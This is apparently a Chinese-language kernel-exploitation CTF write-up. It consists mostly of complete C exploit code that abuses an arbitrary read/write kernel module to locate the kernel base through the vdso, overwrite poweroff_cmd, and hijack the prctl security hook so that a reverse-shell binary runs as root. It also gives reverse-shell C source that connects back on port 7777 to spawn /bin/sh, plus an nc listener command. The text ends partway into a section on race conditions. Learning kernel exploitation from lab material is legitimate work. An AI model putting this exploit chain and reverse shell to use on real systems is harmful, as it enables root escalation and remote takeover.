
```c
// gcc -static exp.c -o exp
//ffffffff812adb90 T security\_task\_prctl
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/time.h>
#include <sys/auxv.h>
//poweroff字符串的偏移
#define POWEROFF\_CMD 0xe39c40
//orderly\_poweroff函数的偏移
#define ORDERLY\_POWEROFF 0x070060
//prctl\_hook的偏移
#define PRCTL\_HOOK 0xe7c7d8;
struct arbWriteNote
{
ssize\_t addr;
ssize\_t len;
char\* data;
};
struct arbWriteNote arbWriteObj;
//open dev
int openDev(char\* pos);
int get\_gettimeofday\_str\_offset();
int main(int argc, char \*argv[])
{
setvbuf(stdin,0,2,0);
setvbuf(stdout,0,2,0);
setvbuf(stderr,0,2,0);
int devFD;
//open Dev
char\* pos = "/dev/arbWriteModule";
devFD = openDev(pos);
// //set comm[TASK\_COMM\_LEN]
// char target[16];
// strcpy(target,"tryToFindPIG007");
// prctl(PR\_SET\_NAME,target);
char \*buf = (char \*)calloc(1,0x1000);
int gettimeofday\_str\_offset = get\_gettimeofday\_str\_offset();
printf("gettimeofday str in vdso.so offset=0x%x\n",gettimeofday\_str\_offset);
size\_t vdso\_addr = -1;
for (size\_t addr=0xffffffff80000000;addr < 0xffffffffffffefff;addr += 0x1000) {
//读取一页数据
arbitrary\_read(devFD,0x1000,buf,addr);
//如果在对应的偏移处，正好是这个字符串，那么我们就能确定当前就是vdso的地址
//之所以能确定，是因为我们每次读取了0x1000字节数据，也就是1页，而vdso的映射也只是1页
if (!strcmp(buf+gettimeofday\_str\_offset,"gettimeofday")) {
printf("[+]find vdso.so!!\n");
vdso\_addr = addr;
printf("[+]vdso in kernel addr=0x%lx\n",vdso\_addr);
break;
}
}
if (vdso\_addr == -1) {
printf("[-]can't find vdso.so!!\n");
}
//计算出kernel基地址
size\_t kernel\_base = vdso\_addr & 0xffffffffff000000;
printf("[+]kernel\_base=0x%lx\n",kernel\_base);
size\_t poweroff\_cmd\_addr = kernel\_base + POWEROFF\_CMD;
printf("[+]poweroff\_cmd\_addr=0x%lx\n",poweroff\_cmd\_addr);
size\_t orderly\_poweroff\_addr = kernel\_base + ORDERLY\_POWEROFF;
printf("[+]orderly\_poweroff\_addr=0x%lx\n",orderly\_poweroff\_addr);
size\_t prctl\_hook\_addr = kernel\_base + PRCTL\_HOOK;
printf("[+]prctl\_hook\_addr=0x%lx\n",prctl\_hook\_addr);
//反弹shell，执行的二进制文件，由call\_usermodehelper来执行，自带root
char reverse\_command[] = "/reverse\_shell";
//修改poweroff\_cmd\_addr处的字符串为我们需要执行的二进制文件的路径
arbitrary\_write(devFD,strlen(reverse\_command),reverse\_command,poweroff\_cmd\_addr);
//hijack prctl，使得task\_prctl指向orderly\_poweroff函数
arbitrary\_write(devFD,0x8,&orderly\_poweroff\_addr,prctl\_hook\_addr);
if (fork() == 0) { //fork一个子进程，来触发shell的反弹
prctl(0,0);
exit(-1);
} else {
printf("[+]open a shell\n");
system("nc -lvnp 7777");
}
return 0;
}
int openDev(char\* pos){
int devFD;
printf("[+] Open %s...\n",pos);
if ((devFD = open(pos, O\_RDWR)) < 0) {
printf(" Can't open device file: %s\n",pos);
exit(1);
}
return devFD;
}
//获取vdso里的字符串"gettimeofday"相对vdso.so的偏移
int get\_gettimeofday\_str\_offset() {
//获取当前程序的vdso.so加载地址0x7ffxxxxxxxx
size\_t vdso\_addr = getauxval(AT\_SYSINFO\_EHDR);
char\* name = "gettimeofday";
if (!vdso\_addr) {
printf("[-]error get name's offset\n");
}
//仅需要搜索1页大小即可，因为vdso映射就一页0x1000
size\_t name\_addr = memmem(vdso\_addr, 0x1000, name, strlen(name));
if (name\_addr < 0) {
printf("[-]error get name's offset\n");
}
return name\_addr - vdso\_addr;
}
void arbitrary\_read(int devFD,int len,char \*buf,size\_t addr)
{
arbWriteObj.len = len;
arbWriteObj.data = buf;
arbWriteObj.addr = addr;
ioctl(devFD,111,&arbWriteObj);
}
void arbitrary\_write(int devFD,int len,char \*buf,size\_t addr)
{
arbWriteObj.len = len;
arbWriteObj.data = buf;
arbWriteObj.addr = addr;
ioctl(devFD,222,&arbWriteObj);
}
```

# 反弹Shell

```c
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
int main(int argc,char \*argv[])
{
//system("chmod 777 /flag");
int sockfd,numbytes;
char buf[BUFSIZ];
struct sockaddr\_in their\_addr;
printf("break!");
while((sockfd = socket(AF\_INET,SOCK\_STREAM,0)) == -1);
printf("We get the sockfd~\n");
their\_addr.sin\_family = AF\_INET;
their\_addr.sin\_port = htons(7777);
their\_addr.sin\_addr.s\_addr=inet\_addr("127.0.0.1");
bzero(&(their\_addr.sin\_zero), 8);
while(connect(sockfd,(struct sockaddr\*)&their\_addr,sizeof(struct sockaddr)) == -1);
dup2(sockfd,0);
dup2(sockfd,1);
dup2(sockfd,2);
system("/bin/sh");
return 0;
}
```

或者直接`system("chmod 777 /flag");`也是获取flag的一种方式。

▲vdso的劫持一直没有复现成功过，明明已经劫持`gettimeofday()`函数的内容为shellcode，然后也挂载了循环调用`gettimeofday()`的程序，但是就是运行不了shellcode。

参考：

<a href="elink@4c9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0t1H3y4o6x3I4z5g2)9J5x3$3R3K6i4K6u0V1x3e0t1`.">Kernel Pwn 学习之路 - 番外 - 安全客，安全资讯平台 (anquanke.com)</a>

<mark class="encrypted">b22K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2B7K9h3q4F1M7$3S2#2i4K6u0W2j5$3!0E0i4K6u0r3M7q4)9J5c8U0l9%4z5e0V1@1k6U0S2T1x3X3u0T1x3l9`.`.</mark>

<mark class="encrypted">785K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4W2j5h3q4K6k6h3g2K6j5g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9@1y4U0V1#2x3K6V1&6</mark>

# 前言

这里尝试各种各样的骚操作解法

# 一、多线程的真条件竞争

## 1.简单的多线程

先给出自己编写的题目源码，参照多方题目，主要还是0CTF2018-baby

|  |  |

| --- | --- |
